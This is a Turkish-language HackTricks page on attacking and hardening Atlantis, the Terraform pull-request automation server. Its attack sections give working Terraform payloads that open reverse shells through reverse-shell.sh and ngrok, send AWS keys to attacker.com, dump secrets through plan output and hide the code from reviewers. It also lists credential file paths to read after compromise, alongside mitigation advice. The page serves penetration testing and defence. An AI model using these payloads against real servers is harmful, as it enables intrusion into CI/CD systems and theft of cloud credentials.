# Atlantis Güvenliği

<details>

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

Atlantis temel olarak, terraform'ı git sunucunuzdaki Pull İsteklerinden çalıştırmanıza yardımcı olur.

![](<../.gitbook/assets/image (161).png>)

## Yerel Laboratuvar

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) adresindeki **atlantis sürümleri sayfasına** gidin ve size uygun olanı **indirin**.
2. **Github** kullanıcınızın **repo erişimi** olan bir **kişisel belirteci** oluşturun
3. `./atlantis testdrive` komutunu çalıştırın ve **atlantis ile iletişim kurabileceğiniz bir demo repo** oluşturacaktır.
1. 127.0.0.1:4141 adresindeki web sayfasına erişebilirsiniz

## Atlantis Erişimi

### Git Sunucu Kimlik Bilgileri

**Atlantis**, **Github**, **Gitlab**, **Bitbucket** ve **Azure DevOps** gibi çeşitli git sunucularını destekler.\
Ancak, bu platformlardaki depolara erişmek ve işlemler gerçekleştirmek için, bunlara bazı **ayrıcalıklı erişimlerin verilmiş olması gerekir** (en azından yazma izinleri).\
[**Belgeler**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional), Atlantis için özellikle bu platformlarda bir kullanıcı oluşturmanızı teşvik eder, ancak bazı kişiler kişisel hesaplarını kullanabilir.

{% hint style="warning" %}
Her durumda, bir saldırganın bakış açısından, **Atlantis hesabı** çok **ilginç bir hedef olacaktır**.
{% endhint %}

### Webhooks

Atlantis, **Webhook sırlarını** isteğe bağlı olarak kullanır, böylece aldığı **webhook'ların** Git sunucunuzdan **geçerli** olduğunu doğrular.

Bunu doğrulamanın bir yolu, isteklerin yalnızca Git sunucunuzun IP'lerinden gelmesine izin vermek olabilir, ancak daha kolay bir yol Webhook Sırrı kullanmaktır.

Özel bir github veya bitbucket sunucusu kullanmadıkça, webhook uç noktalarını İnternete açmanız gerekeceğini unutmayın.

{% hint style="warning" %}
Atlantis, git sunucusunun bilgileri gönderebilmesi için **webhook'ları açığa çıkaracak**, bu nedenle bir saldırganın bakış açısından önemli olabilir **onun mesaj gönderebilir mi** öğrenmek.
{% endhint %}

### Sağlayıcı Kimlik Bilgileri <a href="#provider-credentials" id="provider-credentials"></a>

[Belgelerden:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis, Terraform'ı sadece **`terraform plan` ve `apply`** komutlarını **çalıştırarak** çalıştırır. Yerel olarak Terraform çalıştırdığınızda olduğu gibi, Atlantis'in belirli sağlayıcınız için kimlik bilgilerine ihtiyacı vardır.

Sağlayıcınıza özgü kimlik bilgilerini Atlantis'e nasıl sağlayacağınıza siz karar verirsiniz:

* Atlantis [Helm Şeması](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ve [AWS Fargate Modülü](https://www.runatlantis.io/docs/deployment.html#aws-fargate) sağlayıcı kimlik bilgileri için kendi mekanizmalarına sahiptir. Belgelerini okuyun.
* Atlantis'i bir bulutta çalıştırıyorsanız, birçok bulutun üzerinde çalışan uygulamalara bulut API erişimi verme yolları vardır, örn:
* [AWS EC2 Roller](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) ("EC2 Rolü" arayın)
* [GCE Örnek Hizmet Hesapları](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Birçok kullanıcı ortam değişkenleri ayarlar, örn. `AWS_ACCESS_KEY`, Atlantis'in çalıştığı yerde.
* Diğerleri gerekli yapılandırma dosyalarını oluşturur, örn. `~/.aws/credentials`, Atlantis'in çalıştığı yerde.
* Sağlayıcı kimlik bilgilerini almak için [HashiCorp Vault Sağlayıcısını](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) kullanın.

{% hint style="warning" %}
**Atlantis'in çalıştığı konteynerin** büyük olasılıkla, Terraform aracılığıyla yönettiği sağlayıcılara (AWS, GCP, Github...) ait **ayrıcalıklı kimlik bilgileri** içerecektir.
{% endhint %}

### Web Sayfası

Varsayılan olarak Atlantis, **localhost'ta 4141 numaralı portta** bir **web sayfası çalıştıracaktır**. Bu sayfa sadece atlantis uygulamasını etkinleştirmenize / devre dışı bırakmanıza ve depoların plan durumunu kontrol etmenize ve kilidini açmanıza izin verir (şeyleri değiştirmenize izin vermez, bu yüzden çok kullanışlı değildir).

İnternete açık bulamayabilirsiniz, ancak varsayılan olarak erişmek için **kimlik bilgilerine ihtiyaç olmadığı** görünüyor (ve varsa, `atlantis`:`atlantis` **varsayılan** olanlardır).

## Sunucu Yapılandırması

`atlantis server` yapılandırması, komut satırı bayrakları, ortam değişkenleri, bir yapılandırma dosyası veya üçünün bir karışımı aracılığıyla belirtilebilir.

* Atlantis sunucusu tarafından desteklenen [**bayrakların listesini burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
* Bir yapılandırma seçeneğini bir ortam değişkenine nasıl dönüştüreceğinizi [**burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Değerler **şu sırayla seçilir**:

1. Bayraklar
2. Ortam Değişkenleri
3. Yapılandırma Dosyası

{% hint style="warning" %}
Yapılandırmada **belirli değerler** gibi ilginç değerler bulabilirsiniz, örneğin **belirteçler ve şifreler**.
{% endhint %}

### Depoların Yapılandırılması

Bazı yapılandırmalar **depoların nasıl yönetildiğini etkiler**. Ancak, **her depo için farklı ayarların gereklilik olabileceği** için her depoyu belirtmenin yolları vardır. Bu öncelik sırasıdır:

1. Depo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) dosyası. Bu dosya, atlantis'in depoyu nasıl işlemesi gerektiğini belirtmek için kullanılabilir. Ancak, varsayılan olarak bazı anahtarlar burada belirtilmeden kullanılamaz.
1. Muhtemelen `allowed_overrides` veya `allow_custom_workflows` gibi bayraklar tarafından izin verilmesi gerekebilir
2. [**Sunucu Tarafı Yapılandırma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Bu, her depo için yeni ayarlar yapılandıran bir yaml'dir ve `--repo-config` bayrağı ile iletilir (regexler desteklenir)
3. **Varsayılan** değerler
#### PR Korumaları

Atlantis, **PR**'nin **`onaylanmasını`** başka bir kişiye bırakmak isteyip istemediğinizi belirtmenize izin verir (bu, dal korumasında ayarlanmamış olsa bile) ve/veya **uygulanmadan önce** **`birleştirilebilir`** olmasını sağlar (dal korumaları geçildi). Güvenlik açısından, her iki seçeneğin de ayarlanması önerilir.

Eğer `allowed_overrides` True ise, bu ayarlar **her projede `/atlantis.yml` dosyası ile üzerine yazılabilir**.

#### Komut Dosyaları

Depo yapılandırması, bir **iş akışının yürütülmesinden [**önce**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_ön iş akışı kancaları_) ve [**sonrasında**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_son iş akışı kancaları_) çalıştırılacak komut dosyalarını **belirtebilir**.

Bu komut dosyalarını **depoda `/atlantis.yml`** dosyasında **belirtme** seçeneği bulunmamaktadır.

#### İş Akışı

Depo yapılandırmasında (sunucu tarafı yapılandırma) [**yeni varsayılan bir iş akışı belirtebilir**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) veya [**yeni özel iş akışları oluşturabilirsiniz**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Ayrıca, oluşturulan **yeni** iş akışlarına **erişebilecek** **depoları belirtebilirsiniz**.\
Daha sonra, her depo için **atlantis.yaml** dosyasına **kullanılacak iş akışını belirtebilirsiniz**.

{% hint style="danger" %}
Eğer [**sunucu tarafı yapılandırma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayrağı `allow_custom_workflows` **True** olarak ayarlanmışsa, iş akışları her depodaki **`atlantis.yaml`** dosyasında **belirtilebilir**. Ayrıca, **`allowed_overrides`**'ın ayrıca **`workflow`**'u **geçersiz kılama iş akışını belirtmesi gerekebilir**.\
Bu temelde, bu, **o depoya erişebilen her kullanıcıya Atlantis sunucusunda RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest Politika Kontrolü

Atlantis, plan çıktısına karşı **sunucu tarafında** [**conftest**](https://www.conftest.dev/) **politikalarını** çalıştırmayı destekler. Bu adımı kullanmanın yaygın kullanım durumları şunları içerir:

* Bir modül listesinin kullanımını reddetme
* Bir kaynağın oluşturma zamanındaki özelliklerini doğrulama
* Kazara kaynak silmelerini yakalama
* Güvenlik risklerini önleme (ör. güvenli bağlantı noktalarını genel kullanıma açma)

Nasıl yapılandırılacağını [**belgelerde**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) kontrol edebilirsiniz.

## Atlantis Komutları

[**Belgelerde**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) Atlantis çalıştırmak için kullanabileceğiniz seçenekleri bulabilirsiniz:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Saldırılar

{% hint style="warning" %}
Eğer sömürü sırasında bu **hata**'yı bulursanız: `Error: Error acquiring the state lock`

Çözebilirsiniz, şu şekilde çalıştırarak:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Yeni PR'de Yapılandırma Değişikliği

Eğer bir depo üzerinde yazma erişiminiz varsa, üzerinde yeni bir dal oluşturabilir ve bir PR oluşturabilirsiniz. Eğer `atlantis plan` komutunu **çalıştırabilirseniz** (veya belki otomatik olarak çalıştırılıyorsa) **Atlantis sunucusu içinde RCE yapabilirsiniz**.

Bunu yapabilirsiniz [**Atlantis'ın harici bir veri kaynağını yüklemesini sağlayarak**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Sadece aşağıdaki gibi bir yükü ekleyin `main.tf` dosyasına:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Görünmez Saldırı

Bu saldırıyı daha **görünmez bir şekilde** gerçekleştirebilirsiniz, aşağıdaki önerileri takip ederek:

* Terraform dosyasına doğrudan rev shell eklemek yerine, rev shell içeren **harici bir kaynağı yükleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* Dış kaynaktaki **ref** özelliğini kullanarak, **terraform rev shell kodunu bir dal içinde gizlemek** için şuna benzer bir şey yapın: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* Atlantis'i tetiklemek için **master'a PR oluşturmak yerine**, **2 dal oluşturun** (test1 ve test2) ve birinden diğerine bir **PR oluşturun**. Saldırıyı tamamladığınızda, sadece **PR'yi ve dalları kaldırın**.

### Atlantis Plan Secrets Dump

`atlantis plan` (`terraform plan`) çalıştırarak **terraform tarafından kullanılan sırları dökebilirsiniz**. Terraform dosyasına şöyle bir şey ekleyerek:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis uygula RCE - Yeni PR'de Config değişikliği

Eğer bir depoya yazma erişiminiz varsa, üzerinde yeni bir dal oluşturabilir ve bir PR oluşturabilirsiniz. **`atlantis apply` komutunu çalıştırabilirseniz Atlantis sunucusu içinde RCE yapabilirsiniz**.

Ancak genellikle bazı korumaları atlatmanız gerekecektir:

* **Birleştirilebilir**: Eğer bu koruma Atlantis'te ayarlanmışsa, **`atlantis apply` komutunu sadece PR birleştirilebilirse çalıştırabilirsiniz** (bu da demek oluyor ki dal korumasını atlatmanız gerekmektedir).
* Potansiyel [**dal korumaları atlatmalarını kontrol edin**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Onaylı**: Eğer bu koruma Atlantis'te ayarlanmışsa, **başka bir kullanıcının PR'yi onaylaması gerekmektedir** ki `atlantis apply` komutunu çalıştırabilin.
* Varsayılan olarak, bu korumayı atlatmak için [**Gitbot token'ını kötüye kullanabilirsiniz**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

**Kötü niyetli Terraform dosyasında `terraform apply` komutunu çalıştırma** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** ile.**\
Sadece aşağıdaki gibi bir payload'ın `main.tf` dosyasında bulunduğundan emin olmanız gerekmektedir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
### Terraform Param Enjeksiyonu

`atlantis plan` veya `atlantis apply` çalıştırılırken terraform altında çalıştırıldığında, atlantis üzerinden terraform'a komutlar iletmek için aşağıdaki gibi yorum satırı ekleyebilirsiniz:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
### Özel İş Akışı

Bazı korumaları atlamaya yardımcı olabilecek ortam değişkenlerini geçebileceğiniz bir şeydir. Terraform ortam değişkenlerini [buradan](https://www.terraform.io/cli/config/environment-variables) kontrol edin.

**Kötü niyetli özel derleme komutlarını** çalıştırma, `atlantis.yaml` dosyasında belirtilen. Atlantis, `master`'ın değil, çekme isteği dalındaki `atlantis.yaml` dosyasını kullanır.\
Bu olasılık önceki bir bölümde belirtilmiştir:

{% hint style="danger" %}
Eğer [**sunucu tarafı yapılandırması**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayrağı `allow_custom_workflows` **True** olarak ayarlanmışsa, iş akışları her depodaki **`atlantis.yaml`** dosyasında **belirtilebilir**. Ayrıca, **`allowed_overrides`**'in ayrıca **`workflow`**'u belirtmesi gerekebilir, böylece kullanılacak olan iş akışı **geçersiz kılınabilir**.

Bu temelde, bu, **o depoya erişebilen herhangi bir kullanıcıya Atlantis sunucusunda RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Atlatma plan/uygulama korumaları

Eğer [**sunucu tarafı yapılandırması**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayrağı `allowed_overrides` _şeklinde_ yapılandırılmışsa, bir depoya **planı/uygulama korumalarını değiştirerek bunları atlamak mümkün olabilir**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Hijacking

Eğer birisi **geçerli pull isteklerinize** **`atlantis plan/apply` yorumları gönderirse,** terraformun istenmeyen şekilde çalışmasına neden olacaktır.

Ayrıca, eğer **branch korumasında** herhangi bir **yeni commit itildiğinde PR'nin yeniden değerlendirilmesini istemeye** yönelik bir yapılandırma yapmazsanız, birisi terraform yapılandırmasına **kötü niyetli yapılandırmalar** (önceki senaryoları kontrol edin) yazabilir, `atlantis plan/apply` çalıştırabilir ve RCE elde edebilir.

Bu, Github branch korumalarındaki **ayar** şudur:

![](<../.gitbook/assets/image (216).png>)

### Webhook Secret

Eğer **kullanılan webhook secret'ı çalmayı başarırsanız** veya **hiçbir webhook secret'ı kullanılmıyorsa**, Atlantis webhook'unu **çağırabilir** ve **atlantis komutlarını doğrudan çağırabilirsiniz**.

### Bitbucket

Bitbucket Cloud **webhook secret'ı desteklemez**. Bu, saldırganların Bitbucket'tan **sahte istekler yapmasına** izin verebilir. Yalnızca Bitbucket IP'lerine izin verdiğinizden emin olun.

* Bu, bir **saldırganın** Bitbucket'tan geldiği gibi görünen **Atlantis'a sahte isteklerde bulunabileceği** anlamına gelir.
* `--repo-allowlist` belirtiyorsanız, yalnızca bu depolarla ilgili sahte isteklerde bulunabilirler, bu yüzden yapabilecekleri en büyük zarar kendi depolarınızda plan/apply yapmaktır.
* Bunu önlemek için [Bitbucket'ın IP adreslerine](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) izin verin (Çıkış IPv4 adreslerine bakın).

## Sonrası Sızma

Sunucuya erişmeyi başardıysanız veya en azından bir LFI elde ettiyseniz okumaya çalışmanız gereken bazı ilginç şeyler vardır:

* `/home/atlantis/.git-credentials` VCS erişim kimlik bilgilerini içerir
* `/atlantis-data/atlantis.db` Daha fazla bilgi içeren VCS erişim kimlik bilgilerini içerir
* `/atlantis-data/repos/<org_adı>`_`/`_`<repo_adı>/<pr_num>/<çalışma_alanı>/<dizin_yolu>/.terraform/terraform.tfstate` Terraform durum dosyası
* Örnek: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Ortam değişkenleri
* `/proc/[2-20]/cmdline` `atlantis server`'ın komut satırı (duyarlı veriler içerebilir)

## Hafifletmeler

### Genel Depolarda Kullanmayın <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Herkes genel pull isteklerine yorum yapabilir, mevcut tüm güvenlik hafifletmelerine rağmen, güvenlik ayarlarının doğru yapılandırılmadan genel depolarda Atlantis çalıştırmak tehlikelidir.

### `--allow-fork-prs` Kullanmayın <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Önerilmeyen genel bir depoda çalışıyorsanız, `--allow-fork-prs` (varsayılan olarak false) ayarını yapmamalısınız çünkü herkes kendi fork'undan repo'nuzdaki bir pull isteği açabilir.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis, `--repo-allowlist` bayrağı aracılığıyla web kancalarını kabul edeceği depoların bir izin listesini belirtmenizi gerektirir. Örneğin:

* Belirli depolar: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Tüm organizasyonunuz: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise yüklemenizdeki tüm depolar: `--repo-allowlist=github.yourcompany.com/*`
* Tüm depolar: `--repo-allowlist=*`. Bir webhook secret belirlemeden güvenli bir ağda olmanız durumunda faydalıdır ancak tehlikelidir.

Bu bayrak, Atlantis yüklemenizin kontrolünüz dışındaki depolarla kullanılmadığından emin olur. Daha fazla ayrıntı için `atlantis server --help`'e bakın.

### Terraform Planlamasını Koruma <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Saldırganların kötü niyetli Terraform kodlarıyla pull istekleri göndermesi tehdit modelinizdeyse, `terraform apply` onayları yeterli değildir. Bir `terraform plan` içinde kötü niyetli kod çalıştırmak mümkündür, [`external` veri kaynağı](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) veya kötü niyetli bir sağlayıcı belirterek. Bu kod daha sonra kimlik bilgilerinizi dışarıya çıkarabilir.

Bunu önlemek için şunları yapabilirsiniz:

1. Sağlayıcıları Atlantis görüntüsüne veya ana bilgisayara yerleştirin ve üretimde çıkışı reddedin.
2. Sağlayıcı kaydı protokolünü içeride uygulayın ve genel çıkışı reddedin, böylece kimin sağlayıcı kaydına yazma erişimine sahip olduğunu kontrol edersiniz.
3. [Sunucu tarafı repo yapılandırmanızı](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan` adımını yasaklayacak şekilde değiştirin, yasaklı sağlayıcıların veya veri kaynaklarının kullanımını doğrulayın veya izin verilmeyen kullanıcılardan gelen PR'leri reddedin. Bu noktada ek doğrulama ekleyebilirsiniz, örneğin `plan`'ın devam etmesine izin vermeden önce PR'a "thumbs-up" gerektirebilirsiniz. Conftest burada kullanışlı olabilir.

### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis, `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` ortam değişkenleri aracılığıyla ayarlanmış Webhook secret'ı ile çalıştırılmalıdır. `--repo-allowlist` bayrağı ayarlanmış olsa bile, webhook secret olmadan saldırganlar, izin verilen bir depo gibi davranarak Atlantis'a isteklerde bulunabilir. Webhook secret'lar, webhook isteklerinin gerçekten VCS sağlayıcınızdan (GitHub veya GitLab) geldiğini sağlar.

Azure DevOps kullanıyorsanız, webhook secret'lar yerine temel bir kullanıcı adı ve şifre ekleyin.

### Azure DevOps Temel Kimlik Doğrulaması <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps, tüm webhook etkinliklerinde temel kimlik doğrulama başlığı göndermeyi destekler. Webhook konumunuz için bir HTTPS URL kullanmanızı gerektirir.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Webhook secret'larını kullanıyorsanız ancak trafiğiniz HTTP üzerinden ise, webhook secret'lar çalınabilir. `--ssl-cert-file` ve `--ssl-key-file` bayraklarını kullanarak SSL/HTTPS'yi etkinleştirin.

### Atlantis Web Sunucusunda Kimlik Doğrulamasını Etkinleştirme <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Web hizmetinde kimlik doğrulamasını etkinleştirmek çok önerilir. `--web-basic-auth=true` kullanarak BasicAuth'i etkinleştirin ve `--web-username=yourUsername` ve `--web-password=yourPassword` bayraklarıyla bir kullanıcı adı ve şifre belirleyin.

Bunları ayrıca ortam değişkenleri olarak geçirebilirsiniz `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` ve `ATLANTIS_WEB_PASSWORD=yourPassword`.

## Referanslar

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Destek HackTricks</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github depolarına PR göndererek hacking püf noktalarını paylaşın.

</details>
{% endhint %}
